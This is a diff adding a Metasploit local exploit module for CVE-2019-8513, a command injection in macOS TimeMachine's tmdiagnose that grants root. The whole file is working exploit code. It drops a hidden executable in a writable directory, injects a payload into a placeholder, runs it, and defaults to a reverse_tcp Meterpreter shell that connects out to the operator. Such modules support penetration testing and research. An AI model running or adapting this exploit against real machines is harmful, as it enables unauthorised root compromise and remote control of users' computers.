@@ -1,0 +1,105 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = ExcellentRanking
+
+  include Msf::Post::File
+  include Msf::Post::OSX::Priv
+  include Msf::Post::OSX::System
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'          => 'Mac OS X TimeMachine (tmdiagnose) Command Injection Privilege Escalation',
+      'Description'   => %q{
+          This module exploits a command injection in TimeMachine on macOS <= 10.14.3 in
+        order to run a payload as root. The tmdiagnose binary on OSX <= 10.14.3 suffers
+        from a command injection vulnerability that can be exploited by creating a
+        specially crafted disk label.
+
+          The tmdiagnose binary uses awk to list every mounted volume, and composes
+        shell commands based on the volume labels. By creating a volume label with the
+        backtick character, we can have our own binary executed with root priviledges.
+      },
+      'License'       => MSF_LICENSE,
+      'Author'        => [
+          'CodeColorist', # Discovery and exploit
+          'timwr',        # Metasploit module
+      ],
+      'References'     => [
+          ['CVE', '2019-8513'],
+          ['URL', 'https://medium.com/0xcc/rootpipe-reborn-part-i-cve-2019-8513-timemachine-root-command-injection-47e056b3cb43'],
+          ['URL', 'https://support.apple.com/en-in/HT209600'],
+          ['URL', 'https://github.com/ChiChou/sploits'],
+      ],
+      'DefaultTarget'  => 0,
+      'DefaultOptions' => { 'WfsDelay' => 300, 'PAYLOAD' => 'osx/x64/meterpreter/reverse_tcp' },
+      'Targets'        => [
+          [ 'Mac OS X x64 (Native Payload)', { 'Arch' => ARCH_X64, 'Platform' => [ 'osx' ] } ],
+          [ 'Python payload',                { 'Arch' => ARCH_PYTHON, 'Platform' => [ 'python' ] } ],
+          [ 'Command payload',               { 'Arch' => ARCH_CMD, 'Platform' => [ 'unix' ] } ],
+      ],
+      'DisclosureDate' => 'Apr 13 2019'))
+    register_advanced_options [
+      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])
+    ]
+  end
+
+  def upload_executable_file(filepath, filedata)
+    print_status("Uploading file: '#{filepath}'")
+    write_file(filepath, filedata)
+    chmod(filepath)
+    register_file_for_cleanup(filepath)
+  end
+
+  def check
+    version = Gem::Version.new(get_system_version)
+    if version >= Gem::Version.new('10.14.4')
+      CheckCode::Safe
+    else
+      CheckCode::Appears
+    end
+  end
+
+  def exploit
+    if check != CheckCode::Appears
+      fail_with Failure::NotVulnerable, 'Target is not vulnerable'
+    end
+
+    if is_root?
+      fail_with Failure::BadConfig, 'Session already has root privileges'
+    end
+
+    unless writable? datastore['WritableDir']
+      fail_with Failure::BadConfig, "#{datastore['WritableDir']} is not writable"
+    end
+
+    exploit_data = File.binread(File.join(Msf::Config.data_directory, "exploits", "CVE-2019-8513", "exploit" ))
+    if target['Arch'] == ARCH_X64
+      root_cmd = payload.encoded
+    else
+      root_cmd = payload.raw
+      if target['Arch'] == ARCH_PYTHON
+        root_cmd = "echo \"#{root_cmd}\" | python"
+      end
+      root_cmd = "CMD:#{root_cmd}"
+    end
+    if root_cmd.length > 1024
+      fail_with Failure::PayloadFailed, "Payload size (#{root_cmd.length}) exceeds space in payload placeholder"
+    end
+
+    placeholder_index = exploit_data.index('ROOT_PAYLOAD_PLACEHOLDER')
+    exploit_data[placeholder_index, root_cmd.length] = root_cmd
+
+    exploit_file = "#{datastore['WritableDir']}/.#{Rex::Text::rand_text_alpha_lower(6..12)}"
+    upload_executable_file(exploit_file, exploit_data)
+
+    print_status("Executing exploit '#{exploit_file}'")
+    result = cmd_exec(exploit_file)
+    print_status("Exploit result:\n#{result}")
+  end
+end
